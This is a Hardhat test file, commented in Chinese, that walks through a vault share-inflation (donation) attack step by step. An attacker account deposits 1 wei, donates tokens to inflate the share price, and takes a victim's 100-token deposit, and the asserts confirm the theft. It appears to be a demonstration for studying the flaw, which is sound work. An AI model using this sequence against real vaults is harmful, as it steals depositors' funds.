import "@nomicfoundation/hardhat-ethers";
import { ethers } from "hardhat";
import { formatEther, parseEther } from "ethers";
import { expect } from "chai";

describe("Vault", function () {
    let token: any;
    let vault: any;
    let deployer: any;
    let account1: any;
    let account2: any;

    const UINT256_MAX = ethers.MaxUint256;

    beforeEach(async function () {
        // 获取测试账户
        [deployer, account1, account2] = await ethers.getSigners();

        // 部署myToken合约
        const TokenFactory = await ethers.getContractFactory("MyToken");
        token = await TokenFactory.deploy();
        await token.waitForDeployment();

    // 部署Vault合约
    const VaultFactory = await ethers.getContractFactory("Vault");
    vault = await VaultFactory.deploy(await token.getAddress());
    await vault.waitForDeployment();

        // 铸造一些token给其余账号
        await token.mint(await account1.getAddress(), parseEther("200"));
        await token.mint(await account2.getAddress(), parseEther("200"));

        // account1 和 account2 同意vault合约去花费代币
        await token.connect(account1).approve(await vault.getAddress(), UINT256_MAX);
        await token.connect(account2).approve(await vault.getAddress(), UINT256_MAX);
    });


    async function print() {
        console.log("=========print result=============");
        // account 1 balance
        console.log("account1 balance==>", await token.balanceOf(await account1.getAddress()));
        // account 2 balance
        console.log("account2 balance==>", await token.balanceOf(await account2.getAddress()));
        // account 1 shares
        console.log("account1 shares==>", await vault.balanceOf(await account1.getAddress()));
        // account 2 shares
        console.log("account2 shares==>", await vault.balanceOf(await account2.getAddress()));
        // vault share
        console.log("vault shares==>", await vault.totalSupply());
    }

    it("应该描述inflation attack", async function() {
        // account1 deposit 1
        await vault.connect(account1).deposit(1);
        await print();
        // account1 transfer 100 * 1e18
        await token.connect(account1).transfer(await vault.getAddress(), parseEther("100"));
        await print();
        // account2 deposit 100 * 1e18
        await vault.connect(account2).deposit(parseEther("100"));
        await print();
        // account1 withdraw all
        await vault.connect(account1).withdraw(1);
        await print();
        // Assert final state
        expect(await token.balanceOf(await account1.getAddress())).to.equal(parseEther("300"));
        expect(await vault.balanceOf(await account2.getAddress())).to.equal(0);
    });

});